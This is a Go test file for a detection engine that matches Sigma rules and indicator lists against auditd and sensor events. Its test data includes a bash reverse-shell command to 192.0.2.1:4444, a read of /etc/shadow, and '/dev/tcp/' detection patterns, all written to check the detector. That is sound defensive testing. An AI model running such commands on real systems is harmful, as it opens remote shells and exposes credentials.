package engine

import (
	"strings"
	"testing"

	"github.com/conor-sometimes/banken/internal/alert"
	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/ioc"
	"github.com/conor-sometimes/banken/internal/parser"
	"github.com/conor-sometimes/banken/internal/sigma"
)

func testRule(t *testing.T, yml string) *sigma.Rule {
	t.Helper()
	r, err := sigma.Compile([]byte(yml))
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	r.Name = "test_rule"
	return r
}

func TestEngineMatchSigmaAndIOC(t *testing.T) {
	r := testRule(t, `title: T
id: abc
level: critical
detection:
  sel:
    CommandLine|contains: /dev/tcp/
  condition: sel`)
	iocs := ioc.NewSet()
	iocs.Add("192.0.2.1", "feed.txt")

	eng := New([]*sigma.Rule{r}, iocs, nil)
	alerts := eng.Match(event.Event{
		Source:      "auditd",
		CommandLine: "bash -i >& /dev/tcp/192.0.2.1/4444",
	})
	if len(alerts) != 2 {
		t.Fatalf("expected 2 alerts (sigma + ioc), got %d: %+v", len(alerts), alerts)
	}
	if alerts[0].Kind != alert.KindSigma || alerts[0].Level != "critical" {
		t.Errorf("first alert should be the critical sigma hit: %+v", alerts[0])
	}
	if alerts[1].Kind != alert.KindIOC || alerts[1].IOC != "192.0.2.1" {
		t.Errorf("second alert should be the IOC hit: %+v", alerts[1])
	}
}

func TestEngineMatchDefaultsLevel(t *testing.T) {
	r := testRule(t, `detection:
  sel:
    Image|endswith: /x
  condition: sel`)
	eng := New([]*sigma.Rule{r}, nil, nil)
	alerts := eng.Match(event.Event{Image: "/bin/x"})
	if len(alerts) != 1 || alerts[0].Level != "medium" {
		t.Fatalf("expected one medium alert, got %+v", alerts)
	}
}

func TestEngineProcessDispatches(t *testing.T) {
	r := testRule(t, `title: T
detection:
  sel:
    Image|endswith: /cat
  condition: sel`)
	rec := &countingSink{}
	disp := alert.NewDispatcher(rec)
	eng := New([]*sigma.Rule{r}, nil, disp)

	input := `type=SYSCALL msg=audit(1.0:1): exe="/usr/bin/cat" uid=0
type=EXECVE msg=audit(1.0:1): argc=2 a0="cat" a1="/etc/shadow"`
	res := eng.Process(parser.Auditd{}, strings.NewReader(input))
	if res.Events != 1 {
		t.Errorf("Events = %d, want 1", res.Events)
	}
	if res.Alerts != 1 {
		t.Errorf("Alerts = %d, want 1", res.Alerts)
	}
	if rec.count != 1 {
		t.Errorf("sink received %d alerts, want 1", rec.count)
	}
}

func TestEngineProcessEventDispatches(t *testing.T) {
	r := testRule(t, `title: T
detection:
  sel:
    Image|endswith: /ping
  condition: sel`)
	rec := &countingSink{}
	disp := alert.NewDispatcher(rec)
	eng := New([]*sigma.Rule{r}, nil, disp)

	// The streaming counterpart to Process: one event in, matched and dispatched immediately.
	n, errs := eng.ProcessEvent(event.Event{Source: "mimi", Image: "/usr/bin/ping"})
	if len(errs) != 0 {
		t.Fatalf("errs = %v", errs)
	}
	if n != 1 {
		t.Errorf("alerts = %d, want 1", n)
	}
	if rec.count != 1 {
		t.Errorf("sink received %d alerts, want 1", rec.count)
	}
}

// TestMimiStreamEventFiresRule proves the sensor-to-brain detection path end to end in code: a
// reverse-shell exec in mimi's OCSF wire shape flows mimi parser -> Event -> ProcessEvent -> a
// Sigma rule -> a dispatched alert. The only thing this cannot exercise without a kernel is the
// probe's live capture of that exec (a sudo load test); everything downstream of the wire is here.
func TestMimiStreamEventFiresRule(t *testing.T) {
	line := `{"schema":"mimi/2","process":{"pid":42,"name":"bash",` +
		`"cmd_line":"bash -i >& /dev/tcp/192.0.2.1/4444",` +
		`"file":{"path":"/usr/bin/bash"},"user":{"uid":"0"}},` +
		`"ancestry":[{"pid":42,"name":"bash"}]}`
	evs, err := parser.Mimi{}.Parse(strings.NewReader(line))
	if err != nil || len(evs) != 1 {
		t.Fatalf("mimi parse: err=%v, events=%d (want 1)", err, len(evs))
	}
	if evs[0].Source != "mimi" {
		t.Fatalf("Source = %q, want mimi", evs[0].Source)
	}

	r := testRule(t, `title: reverse shell
detection:
  sel:
    CommandLine|contains: /dev/tcp/
  condition: sel`)
	rec := &countingSink{}
	eng := New([]*sigma.Rule{r}, nil, alert.NewDispatcher(rec))

	n, errs := eng.ProcessEvent(evs[0])
	if len(errs) != 0 {
		t.Fatalf("errs = %v", errs)
	}
	if n != 1 || rec.count != 1 {
		t.Fatalf("alerts=%d sink=%d, want 1/1 (a mimi exec event must fire the rule and dispatch)", n, rec.count)
	}
}

type countingSink struct{ count int }

func (c *countingSink) Name() string           { return "counting" }
func (c *countingSink) Emit(alert.Alert) error { c.count++; return nil }
func (c *countingSink) Close() error           { return nil }
